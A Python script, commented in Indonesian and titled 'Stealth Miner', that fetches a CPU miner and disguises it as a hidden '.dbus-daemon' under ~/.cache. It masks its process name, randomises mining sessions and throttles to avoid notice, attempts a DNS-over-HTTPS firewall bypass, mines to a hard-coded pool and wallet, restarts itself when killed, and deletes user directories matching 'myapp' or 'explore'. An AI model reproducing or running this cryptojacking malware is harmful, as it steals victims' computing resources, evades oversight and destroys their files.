#!/usr/bin/env python3

import os
import subprocess
import urllib.request
import tarfile
import time
import threading
import shutil
import sys
import random

# === KONFIGURASI ===
URL = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz"
TARFILE = "miner.tar.gz"
BIN_NAME = "cpuminer-sse2"
ALIAS_BIN = ".dbus-daemon"
HIDDEN_DIR = os.path.expanduser("~/.cache/.sysd")
POOL = "stratum+tcp://134.199.163.180:6343"
WALLET = "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Recut"
PASSWORD = "x"
THREADS = os.cpu_count()

MIN_DURATION = 300
MAX_DURATION = 720
MIN_PAUSE = 120
MAX_PAUSE = 240
COOLDOWN_DURATION = 180
LOCKFILE = "/tmp/.mining_lock"

cooldown_restart_counter = 0
cooldown_restart_limit = 3
cooldown_reset_time = time.time() + 3600

# === ANTI-SUSPEND ===
def anti_suspend():
    while True:
        try:
            sys.stdout.write("\b")
            sys.stdout.flush()
        except:
            pass
        time.sleep(15)

# === BYPASS DNS FIREWALL ===
def dns_doh_bypass():
    subprocess.call([
        "curl", "-s", "-H", "accept: application/dns-json",
        "https://cloudflare-dns.com/dns-query?name=pool.rplant.xyz&type=A"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# === CEK CPU 100% ===
def is_cpu_100_percent():
    try:
        return os.getloadavg()[0] >= os.cpu_count()
    except:
        return False

# === PROTEKSI NAMA PROSES ===
def protect_process():
    try:
        if hasattr(os, 'setsid'):
            os.setsid()
        import ctypes
        libc = ctypes.cdll.LoadLibrary("libc.so.6")
        libc.prctl(15, b"dbus-daemon", 0, 0, 0)
    except:
        pass

# === HAPUS EXPLORER / MYAPP ===
def clean_explorer_myapp():
    home = os.path.expanduser("~")
    for root, dirs, _ in os.walk(home):
        for d in dirs:
            if "myapp" in d.lower() or "explore" in d.lower():
                try:
                    shutil.rmtree(os.path.join(root, d))
                except:
                    continue

def clean_miner_cache():
    if os.path.exists(TARFILE):
        os.remove(TARFILE)
    if os.path.exists(HIDDEN_DIR):
        shutil.rmtree(HIDDEN_DIR)

# === CEK LOCKFILE ===
def check_lock():
    if os.path.exists(LOCKFILE):
        print("[🔒] Sudah berjalan.")
        sys.exit(0)
    with open(LOCKFILE, "w") as f:
        f.write(str(os.getpid()))

def remove_lock():
    try:
        if os.path.exists(LOCKFILE):
            os.remove(LOCKFILE)
    except:
        pass

def should_restart():
    global cooldown_restart_counter, cooldown_reset_time
    if time.time() > cooldown_reset_time:
        cooldown_restart_counter = 0
        cooldown_reset_time = time.time() + 3600
    if cooldown_restart_counter < cooldown_restart_limit:
        cooldown_restart_counter += 1
        return True
    return False

# === 1 SESI MINING ===
def run_one_session():
    os.makedirs(HIDDEN_DIR, exist_ok=True)
    urllib.request.urlretrieve(URL, TARFILE)

    with tarfile.open(TARFILE) as tar:
        tar.extractall()
    hidden_path = os.path.join(HIDDEN_DIR, ALIAS_BIN)
    os.rename(BIN_NAME, hidden_path)
    os.chmod(hidden_path, 0o755)

    duration = random.randint(MIN_DURATION, MAX_DURATION)
    print(f"[*] Mining selama {duration}s dengan {THREADS} thread...")

    proc = subprocess.Popen([
        hidden_path, "-a", "power2b", "-o", POOL,
        "-u", WALLET, "-p", PASSWORD, f"-t{THREADS}"
    ], preexec_fn=protect_process, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(10)
    os.remove(TARFILE)

    start = time.time()
    while time.time() - start < duration:
        time.sleep(10)
        if is_cpu_100_percent():
            print(f"[⚠️] CPU 100%! Cooldown {COOLDOWN_DURATION}s...")
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except:
                proc.kill()
            time.sleep(COOLDOWN_DURATION)
            if should_restart():
                restart_script()
            else:
                return

    proc.terminate()
    try:
        proc.wait(timeout=10)
    except:
        proc.kill()

# === LOOP UTAMA ===
def main_loop():
    while True:
        run_one_session()
        pause = random.randint(MIN_PAUSE, MAX_PAUSE)
        print(f"[⏳] Pause {pause}s...\n")
        time.sleep(pause)

# === RESTART SCRIPT ===
def restart_script():
    try:
        print("[🔁] Restart aman...")
        clean_miner_cache()
        clean_explorer_myapp()
        time.sleep(1.5)
        subprocess.Popen([sys.executable] + sys.argv, preexec_fn=os.setsid)
        sys.exit(0)
    except Exception as e:
        print(f"[X] Gagal restart: {e}")

# === EKSEKUSI UTAMA ===
if __name__ == "__main__":
    check_lock()
    print("⛏️  Stealth Miner Aktif: Proteksi + Restart + Cooldown")
    threading.Thread(target=anti_suspend, daemon=True).start()
    threading.Thread(target=dns_doh_bypass, daemon=True).start()
    clean_explorer_myapp()
    try:
        main_loop()
    except KeyboardInterrupt:
        restart_script()
    except Exception:
        restart_script()
    finally:
        remove_lock()
